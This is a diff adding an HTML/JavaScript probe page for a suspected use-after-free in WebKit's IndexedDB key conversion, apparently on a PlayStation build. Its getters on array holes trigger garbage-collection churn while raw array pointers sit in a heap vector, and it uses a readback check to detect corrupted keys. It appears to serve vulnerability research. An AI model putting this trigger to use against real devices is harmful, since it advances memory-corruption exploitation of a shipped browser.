@@ -1,0 +1,112 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>createIDBKeyFromValue — a raw JSArray* chain in an always-heap Vector across a page getter</title>
+<body>
+<script>
+// docs/78. IDBBindingUtilities.cpp:255-258:
+//
+//     static Ref<IDBKey> createIDBKeyFromValue(JSGlobalObject& lexicalGlobalObject, JSValue value)
+//     {
+//         Vector<JSArray*> stack;                      // <- default inline capacity 0: ALWAYS on the heap
+//         RefPtr<IDBKey> key = createIDBKeyFromValue(lexicalGlobalObject, value, stack);
+//
+// and in the recursive overload (:196-250) the array branch does
+//
+//     stack.append(array);                             // raw pointer, no keep-alive
+//     for (size_t i = 0; i < length; i++) {
+//         JSValue item = array->getIndex(&lexicalGlobalObject, i);   // <- :231
+//
+// `JSObject::getIndex` (JSObject.h:409-414) is `if (tryGetIndexQuickly(i)) return …; return get(globalObject, i);`
+// so an index that is a hole falls through to a full `get`, which walks the prototype chain and calls a getter.
+// That is page script running with the ancestor `JSArray*` chain in a heap Vector that the conservative stack
+// scan cannot see — the docs/65 ordering, in the one place in the tree where the vector is heap-resident from
+// the first element.
+//
+// Entry point: `IDBKeyRange.only(value)` → `scriptValueToIDBKey` → `createIDBKeyFromValue` (:428), synchronous,
+// no database and no transaction. The surfaces page measured `typeof indexedDB === 'object'` on this build,
+// despite UnifiedWebPreferences.yaml:3139 defaulting IndexedDBAPIExposeIndexedDBToWindowOrWorkerEnabled to
+// false on PLATFORM(PLAYSTATION).
+//
+// Oracle: after the call, `range.lower` is the key read back through IDBKeyData -> JS, so a level the engine
+// read from a recycled cell shows up as a wrong value. `skew=1` makes one level's getter return 999 instead of
+// its index, which is the oracle's sensitivity control.
+(function () {
+  var Q = new URLSearchParams(location.search);
+  function K(k, d) { return Q.has(k) ? Q.get(k) : d; }
+  function B(m) { try { (new Image()).src = '/ev?m=' + encodeURIComponent(String(m)); } catch (e) {} }
+
+  var N = parseInt(K('n', '8'), 10);          // nesting depth; the vector holds N+1 arrays
+  var CHURN = parseInt(K('churn', '1'), 10);
+  var HOTDEEP = parseInt(K('hot', '1'), 10);  // churn only on the deepest array's holes
+  var MB = parseInt(K('mb', '8'), 10);
+  var OBJS = parseInt(K('objs', '400000'), 10);
+  var SKEW = parseInt(K('skew', '0'), 10);
+  var NOCALL = parseInt(K('nocall', '0'), 10);
+  var KEEP = [];
+  var HITS = 0;
+  var TOTAL = N * 3;                          // N arrays, 3 holes each (level(N-1) holds 'leaf')
+
+  var DECOYS = [];
+  for (var dc = 0; dc < 4; dc++) DECOYS.push((function () { var d = { decoy: dc }; return new WeakRef(d); })());
+  B('boot n=' + N + ' churn=' + CHURN + ' hot=' + HOTDEEP + ' skew=' + SKEW + ' nocall=' + NOCALL);
+
+  setTimeout(function () {
+    if (typeof IDBKeyRange !== 'function') { B('no-IDBKeyRange'); return; }
+    B('idbkeyrange ok');
+
+    function churnAt(tag) {
+      if (CHURN) {
+        for (var i = 0; i < 4; i++) KEEP.push(new ArrayBuffer(MB * 1024 * 1024));
+        for (var j = 0; j < OBJS; j++) KEEP.push({ a: j });
+      }
+      B('gcprobe ' + tag + ' ' + (DECOYS[0].deref() ? 'alive' : 'collected'));
+      if (CHURN) B('churn ' + tag + ' ' + KEEP.length);
+    }
+
+    class HoleArray extends Array {}
+    for (let idx = 0; idx < 3; idx++) {
+      Object.defineProperty(HoleArray.prototype, idx, {
+        configurable: true,
+        get: function () {
+          HITS++;
+          var deep = HITS > TOTAL - 3;
+          if (!HOTDEEP || deep) churnAt('h' + HITS);
+          if (SKEW && HITS === 1) return 999;
+          return idx;
+        }
+      });
+    }
+
+    function level(d) {
+      var a = new HoleArray(4);          // length 4, indices 0..2 are holes
+      a[3] = (d + 1 < N) ? level(d + 1) : 'leaf';
+      return a;
+    }
+
+    var value = level(0);
+    B('built');
+    if (NOCALL) { B('nocall hits=' + HITS); B('done'); return; }
+
+    var r = null;
+    try { r = IDBKeyRange.only(value); } catch (e) { B('THREW ' + e.name + ':' + e.message); B('hits=' + HITS); return; }
+    B('called hits=' + HITS);
+
+    // walk the key back: every level must be a 4-element array [0,1,2,child]
+    var o = null, k = 0, bad = 0, firstBad = -1, got = '';
+    try { o = r.lower; } catch (e) { B('LOWER THREW ' + e.name + ':' + e.message); return; }
+    while (o && typeof o === 'object' && k < N) {
+      var ok = Array.isArray(o) && o.length === 4 && o[0] === 0 && o[1] === 1 && o[2] === 2;
+      if (!ok) {
+        if (!bad) { firstBad = k; got = JSON.stringify(o && o.length).slice(0, 40); }
+        bad++;
+        break;
+      }
+      o = o[3]; k++;
+    }
+    if (k !== N) { if (!bad) { firstBad = k; got = 'short'; } bad++; }
+    else if (o !== 'leaf') { if (!bad) { firstBad = k; got = 'leaf=' + String(o); } bad++; }
+    B('key kind=' + (r ? r.constructor.name : 'null') + ' depth=' + k + ' bad=' + bad + ' first=' + firstBad + ' got=' + got);
+    B('done');
+  }, 0);
+})();
+</script>
